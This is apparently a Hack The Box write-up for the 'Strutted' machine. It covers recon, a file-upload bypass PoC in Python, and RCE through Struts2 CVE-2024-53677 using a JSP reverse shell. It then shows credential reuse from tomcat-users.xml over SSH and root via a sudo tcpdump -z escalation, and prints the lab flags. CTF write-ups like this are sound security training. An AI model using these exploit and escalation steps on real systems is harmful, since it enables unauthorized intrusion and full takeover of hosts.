# Strutted

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.59:22
Open 10.10.11.59:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.59

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```
:::

## HTTP (80)

![Writeup.png](/assets/pentest/htb/strutted/Writeup.png)

### Source Code

There's download action
```bash
└─$ curl http://strutted.htb/download.action -sLo strutted.zip
└─$ unzip strutted.zip -d strutted
```

Looks like source code for the frontend application processing uploads

![Writeup-1.png](/assets/pentest/htb/strutted/Writeup-1.png)

Successful upload makes POST request to [http://strutted.htb/upload.action](http://strutted.htb/upload.action) and image is uploaded to [http://strutted.htb/uploads/20250228_065151/kraken.png](http://strutted.htb/uploads/20250228_065151/kraken.png) and can be shared with [http://strutted.htb/s/7c333c71](http://strutted.htb/s/7c333c71).

### Upload Bypass (try)

We can bypass upload with magic bytes and content type. `extension` is not even used so it can be omitted.

![Writeup-2.png](/assets/pentest/htb/strutted/Writeup-2.png)

We get error that file is not uploaded, but that's only frontend restriction. If we get directory name then we will access the file.

![Writeup-3.png](/assets/pentest/htb/strutted/Writeup-3.png)

Reason for failure: `strutted/strutted/src/main/webapp/WEB-INF/upload.jsp`
```java
<s:if test="hasFieldErrors()">
	<div class="alert alert-danger text-center" role="alert">
		<ul class="list-unstyled m-0">
			Supported file types: JPG, JPEG, PNG, GIF!
		</ul>
	</div>
</s:if>
```

[https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/validation/Errors.html#hasFieldErrors()](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/validation/Errors.html#hasFieldErrors())

POC to upload files
```python
from time import sleep
from io import BytesIO
from requests import Session
from datetime import datetime, timedelta

URL = 'http://strutted.htb'
JPG_HEADER = b'\xFF\xD8\xFF'

with Session() as session:
    session.proxies = {'http': 'http://127.0.0.1:8080'}

    filename = 'letmein.txt'# .gif'
    payload = b'Example payload'
    contents = BytesIO(JPG_HEADER + payload)
    files = {"upload": (filename, contents, "image/jpeg")}
    session.post(f'{URL}/upload.action', files=files)

    now = datetime.now() + timedelta(hours=5)
    for seconds in range(-2, 2):
        upload_dir = (now + timedelta(seconds=seconds)).strftime("%Y%m%d_%H%M%S")
        resp = session.get(f'{URL}/uploads/{upload_dir}/{filename}')
        print(f"[*] {resp.url}")
        if resp.status_code == 404:
            continue

        print(resp.text[len(JPG_HEADER):])
        break
```

I thought it was simply showing error, but no. struts seems to deny requests if the file extension doesn't match allowed types

### RCE (CVE-2024-53677)

![Writeup-4.png](/assets/pentest/htb/strutted/Writeup-4.png)

struts2 version can be found in `pom.xml`
```xml
<properties>
	<project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
	<maven.compiler.source>17</maven.compiler.source>
	<maven.compiler.target>17</maven.compiler.target>
	<struts2.version>6.3.0.1</struts2.version>
	<jetty-plugin.version>9.4.46.v20220331</jetty-plugin.version>
	<maven.javadoc.skip>true</maven.javadoc.skip>
	<jackson.version>2.14.1</jackson.version>
	<jackson-data-bind.version>2.14.1</jackson-data-bind.version>
</properties>
```

It has 2 critical RCE vulnerabilities: [https://security.snyk.io/package/maven/org.apache.struts%3Astruts2-core/6.3.0.1](https://security.snyk.io/package/maven/org.apache.struts%3Astruts2-core/6.3.0.1)

POC: [https://github.com/EQSTLab/CVE-2024-53677](https://github.com/EQSTLab/CVE-2024-53677)

Extra argument is added to post requests which messes with workflow logic and allows bypass.
```python
    # File upload function
    def exploit(self) -> None:
        files = {
            'Upload': ("exploit_file.jsp", self.file_content, 'text/plain'),
            'top.UploadFileName': (None, self.path),
        }
```

Modify the POC to fit our scenario

![Writeup-5.png](/assets/pentest/htb/strutted/Writeup-5.png)

```bash
# Get reverse shell
└─$ sed 's/cmd.exe/bash/g' /usr/share/webshells/jsp/jsp-reverse.jsp > rev.jsp

# Renders image
└─$ py CVE-2024-53677/CVE-2024-53677.py -u 'http://strutted.htb/upload.action' -p ../rev.jsp -f rev.jsp | grep Uploaded
                    <img src="uploads/20250228_083741/../rev.jsp" alt="Uploaded File"/>
# Renders jsp
└─$ py CVE-2024-53677/CVE-2024-53677.py -u 'http://strutted.htb/upload.action' -p ../../rev.jsp -f rev.jsp | grep Uploaded
                    <img src="uploads/20250228_083813/../../rev.jsp" alt="Uploaded File"/>
```

### Reverse Shell (tomcat)

![Writeup-6.png](/assets/pentest/htb/strutted/Writeup-6.png)

Database doesn't have anything
```bash
(remote) tomcat@strutted:/var/lib/tomcat9$ find . -name *.db
./webapps/ROOT/db/url_mappings.db
(remote) tomcat@strutted:/var/lib/tomcat9$ strings ./webapps/ROOT/db/url_mappings.db
...
```

```bash
(remote) tomcat@strutted:/var/lib/tomcat9$ find . -type f | grep -vE '\.(jsp|class|jar|png|gif|jpe?g)$'
./webapps/ROOT.war
./webapps/ROOT/META-INF/maven/org.strutted.htb/strutted/pom.xml
./webapps/ROOT/META-INF/maven/org.strutted.htb/strutted/pom.properties
./webapps/ROOT/META-INF/MANIFEST.MF
./webapps/ROOT/META-INF/war-tracker
./webapps/ROOT/db/url_mappings.db
./webapps/ROOT/WEB-INF/web.xml
./webapps/ROOT/WEB-INF/classes/struts.xml
./webapps/ROOT/WEB-INF/strutted.zip
./policy/catalina.policy
```

### Privilege Escalation (james)

Current directory has symlink, by default `find` doesn't follow them; use `-L` to show all files.
```bash
(remote) tomcat@strutted:/var/lib/tomcat9$ find -L . -type f | grep -vE '\.(jsp|class|jar|png|gif|jpe?g|policy|zip|java)$|catalina'
./conf/jaspic-providers.xml
./conf/tomcat-users.xml
./conf/server.xml
./conf/web.xml
./conf/logging.properties
./conf/context.xml
./logs/localhost.2025-01-16.log.gz
./logs/localhost_access_log.2025-02-28.txt
./logs/localhost_access_log.2025-01-21.txt.gz
./logs/localhost_access_log.2025-01-16.txt.gz
./logs/localhost.2025-02-28.log
./logs/localhost.2025-01-15.log.gz
./logs/localhost_access_log.2025-01-15.txt.gz
./logs/localhost.2025-01-21.log.gz
./webapps/ROOT.war
./webapps/ROOT/META-INF/maven/org.strutted.htb/strutted/pom.xml
./webapps/ROOT/META-INF/maven/org.strutted.htb/strutted/pom.properties
./webapps/ROOT/META-INF/MANIFEST.MF
./webapps/ROOT/META-INF/war-tracker
./webapps/ROOT/db/url_mappings.db
./webapps/ROOT/WEB-INF/web.xml
./webapps/ROOT/WEB-INF/classes/struts.xml
```

```bash
(remote) tomcat@strutted:/var/lib/tomcat9$ cat ./conf/tomcat-users.xml | grep password= | grep -v changed
  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
```

```bash
(remote) tomcat@strutted:/var/lib/tomcat9/conf$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
james:x:1000:1000:Network Administrator:/home/james:/bin/bash
```

## SSH 

```bash
# Password from source code
└─$ sshpass -p 'skqKY6360z!Y' ssh james@strutted.htb
Permission denied, please try again.

# Password from above
└─$ sshpass -p 'IT14d6SSP81k' ssh james@strutted.htb

james@strutted:~$ id
uid=1000(james) gid=1000(james) groups=1000(james),27(sudo)
```

### User.txt

```bash
james@strutted:~$ cat user.txt
c922c741e16b61de702b277c397828e6
```

## Privilege Escalation (root)

```bash
james@strutted:~$ sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

[https://gtfobins.github.io/gtfobins/tcpdump/](https://gtfobins.github.io/gtfobins/tcpdump/)

```bash
james@strutted:~$ COMMAND='install -m4777 /bin/bash /tmp/rootbash'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel

james@strutted:~$ ls /tmp/rootbash -lh
-rwsrwxrwx 1 root root 1.4M Feb 28 08:56 /tmp/rootbash

james@strutted:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1000(james) gid=1000(james) euid=0(root) groups=1000(james),27(sudo)
```

### Root.txt

```bash
rootbash-5.1# cat /root/root.txt
8b4fc8267bebba3777c8bc5954daad9c
```
